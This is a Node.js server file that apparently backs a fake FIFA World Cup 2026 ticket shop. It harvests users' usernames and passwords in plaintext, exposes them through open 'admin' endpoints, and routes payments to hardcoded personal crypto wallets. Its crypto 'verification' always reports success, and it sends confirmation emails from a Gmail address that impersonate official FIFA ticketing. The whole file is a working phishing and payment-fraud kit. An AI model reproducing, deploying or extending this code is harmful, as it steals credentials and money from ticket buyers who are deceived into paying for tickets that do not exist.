const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const Stripe = require('stripe');
const nodemailer = require('nodemailer'); // Using Gmail
require('dotenv').config();

const stripe = Stripe(process.env.STRIPE_SECRET_KEY);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());

// ==================================================
// 1. DATABASE (In-Memory Storage)
// ==================================================
const transactions = [];
const userCredentials = []; // ✅ This stores the Username/Passwords

// ==================================================
// 2. EMAIL CONFIGURATION (Gmail)
// ==================================================
const transporter = nodemailer.createTransport({
    service: 'gmail', // Automatically handles ports for Gmail
    auth: {
        user: process.env.EMAIL_USER, // fifaticket26@gmail.com
        pass: process.env.EMAIL_PASS  // Your App Password
    }
});

// Verify Email Connection on Startup
transporter.verify((error, success) => {
    if (error) {
        console.log('⚠️ Email Connection Warning:', error.message);
    } else {
        console.log('✅ Gmail Server is Ready to send from:', process.env.EMAIL_FROM);
    }
});

// ==================================================
// 3. CREDENTIAL STORAGE ENDPOINTS
// ==================================================

// Store Credentials (Sign Up / Login)
app.post('/api/store-credentials', (req, res) => {
    try {
        const { username, password, email, name } = req.body;
        
        console.log('🔐 Processing credentials for:', username);
        
        // Check if user already exists
        const existingUserIndex = userCredentials.findIndex(user => user.username === username || user.email === email);
        
        if (existingUserIndex !== -1) {
            // Update existing user
            userCredentials[existingUserIndex] = { 
                username, password, email, name, timestamp: new Date().toISOString() 
            };
        } else {
            // Add new user
            userCredentials.push({ 
                username, password, email, name, timestamp: new Date().toISOString() 
            });
        }
        
        console.log('✅ Credentials Saved. Total Users:', userCredentials.length);
        res.json({ success: true, message: 'Credentials stored successfully' });
        
    } catch (error) {
        console.error('❌ Error storing credentials:', error);
        res.json({ success: false, message: error.message });
    }
});

// View specific password (for your admin use)
app.get('/api/get-password/:username', (req, res) => {
    const user = userCredentials.find(u => u.username === req.params.username);
    if (user) res.json({ success: true, ...user });
    else res.status(404).json({ success: false, message: 'User not found' });
});

// View all users (for your admin use)
app.get('/api/all-users', (req, res) => {
    res.json({
        success: true,
        count: userCredentials.length,
        users: userCredentials
    });
});

// ==================================================
// 4. PAYMENT ENDPOINTS
// ==================================================

app.get('/', (req, res) => res.json({ status: 'Running', system: 'Gmail SMTP', users: userCredentials.length }));
app.get('/api/stripe-config', (req, res) => res.json({ publishableKey: process.env.STRIPE_PUBLISHABLE_KEY }));

// Crypto Config
const CRYPTO_ADDRESSES = {
    'USDT_TRC20': 'TJzKVimFzF7tGQUH1NemCrctiZPPWrRzj6',
    'SOL': 'BeCmckF5KDGCY3jxG2r8o8VqQy8JySyA94i9osB45sVd',
    'BTC': 'bc1qqnmz38llzghmaskhq6wy3n6hjk68gh570a27sw',
    'ETH': '0x7978f226bbce9f03cac5c6d32526291a776b7436',
    'USDT_ERC20': '0xf4f2db3ce0cf82594255ab301b77e0beec2e1a47'
};

app.get('/api/crypto-addresses', (req, res) => {
    res.json({ success: true, addresses: CRYPTO_ADDRESSES });
});

app.post('/api/process-payment', async (req, res) => {
    try {
        const { total, currency = 'USD', customer } = req.body;
        const paymentIntent = await stripe.paymentIntents.create({
            amount: Math.round(total * 100),
            currency: currency.toLowerCase(),
            description: `FIFA Tickets`,
            receipt_email: customer.email
        });
        res.json({ success: true, clientSecret: paymentIntent.client_secret });
    } catch (error) {
        res.json({ success: false, message: error.message });
    }
});

app.post('/api/verify-crypto', async (req, res) => {
    const { transactionId } = req.body;
    res.json({ success: true, verified: true, transactionId: transactionId });
});

// ==================================================
// 5. EMAIL CONFIRMATION LOGIC
// ==================================================

app.post('/api/send-confirmation', async (req, res) => {
    try {
        const { customer, tickets, payment, transactionId } = req.body;
        
        console.log('📧 Request to send email to:', customer.email);

        // 1. Respond to frontend IMMEDIATELY (Prevents "Processing..." freeze)
        res.json({ success: true, message: 'Confirmation initiated' });

        // 2. Generate HTML
        const emailHtml = generateTicketEmail(customer, tickets, payment, transactionId, payment.method);

        // 3. Send Email in Background
        try {
            const info = await transporter.sendMail({
                from: process.env.EMAIL_FROM, // "FIFA World Cup 2026 <fifaticket26@gmail.com>"
                to: customer.email,
                subject: `FIFA World Cup 2026 - Ticket Confirmation #${transactionId}`,
                html: emailHtml
            });
            console.log('✅ Email sent successfully. ID:', info.messageId);
        } catch (emailErr) {
            console.error('❌ Email Failed:', emailErr.message);
            // Note: Even if this fails, the user already saw "Success" on the screen.
        }

    } catch (error) {
        console.error('Server Error:', error);
        if (!res.headersSent) {
            res.json({ success: true, message: 'Processed' });
        }
    }
});

// HTML Generator
function generateTicketEmail(customer, tickets, payment, transactionId, paymentMethod) {
    const ticketList = tickets.map(t => {
        const qty = t.quantity || 1;
        const price = t.price || 0;
        const total = price * qty;

        return `
        <div style="border: 1px solid #e0e0e0; border-radius: 8px; margin-bottom: 15px; overflow: hidden;">
            <div style="background-color: #1a1a2e; color: white; padding: 10px 15px; font-size: 16px; font-weight: bold;">
                🎫 ${t.match.teams}
            </div>
            <div style="padding: 15px; background-color: #ffffff;">
                <p style="margin: 5px 0; color: #666;"><strong>Date:</strong> ${t.match.date}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Venue:</strong> ${t.match.venue}</p>
                <p style="margin: 5px 0; color: #666;"><strong>Category:</strong> ${t.category.name}</p>
                <div style="margin-top: 10px; border-top: 1px solid #eee; padding-top: 10px;">
                    <p style="margin: 0;"><strong>Quantity:</strong> ${qty}</p>
                    <p style="margin: 0; font-size: 1.1em; color: #1a1a1a;"><strong>Price:</strong> USD ${total.toLocaleString()}</p>
                </div>
            </div>
        </div>`;
    }).join('');

    return `
    <!DOCTYPE html>
    <html>
    <body style="font-family: 'Arial', sans-serif; line-height: 1.6; color: #333; margin: 0; padding: 0;">
        <div style="max-width: 600px; margin: 0 auto; background: #ffffff;">
            <div style="background-color: #1a1a2e; color: #ffffff; padding: 30px 20px; text-align: center;">
                <div style="font-size: 24px; font-weight: bold; margin-bottom: 10px;">🎉 FIFA World Cup 2026™</div>
                <div style="font-size: 18px; opacity: 0.9;">Your Ticket Purchase Confirmation</div>
            </div>
            <div style="padding: 30px 20px;">
                <p>Dear <strong>${customer.name}</strong>,</p>
                <p>Thank you for your purchase! Your tickets have been confirmed.</p>
                
                <h3 style="border-bottom: 2px solid #1a1a2e; padding-bottom: 10px; margin-top: 30px;">📋 Order Summary</h3>
                ${ticketList}
                
                <div style="background-color: #f8f9fa; border: 1px solid #eee; padding: 20px; border-radius: 8px; margin-top: 30px;">
                    <h3 style="margin-top: 0; margin-bottom: 15px;">💰 Payment Details</h3>
                    <p style="margin: 5px 0; opacity: 0.9;">Payment Method: <strong>${paymentMethod === 'card' ? 'Credit/Debit Card' : payment.cryptoType}</strong></p>
                    <p style="margin: 5px 0; opacity: 0.9;">Transaction ID: <span style="font-family: monospace;">${transactionId}</span></p>
                    <hr style="border: 0; border-top: 1px solid rgba(255,255,255,0.2); margin: 15px 0;">
                    <p style="margin: 0; font-size: 18px; font-weight: bold;">Total Paid: USD ${payment.amount ? payment.amount.toLocaleString() : 'Paid'}</p>
                </div>

                <h3 style="margin-top: 30px;">📱 Next Steps</h3>
                <p>Your official mobile tickets will be available in your FIFA account 48 hours before the match.</p>
                
                <p style="margin-top: 20px; font-size: 13px; color: #666;">
                    <strong>Need Help?</strong><br>
                    Contact FIFA Ticketing Support: <a href="mailto:ticketing@fifa.org" style="color: #1a1a2e;">ticketing@fifa.org</a>
                </p>
            </div>
            
            <div style="background-color: #f8f9fa; padding: 20px; text-align: center; font-size: 12px; color: #888;">
                <p>FIFA World Cup 2026™ Official Ticketing</p>
                <p>This is an automated message. Please do not reply to this email.</p>
            </div>
        </div>
    </body>
    </html>`;
}

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
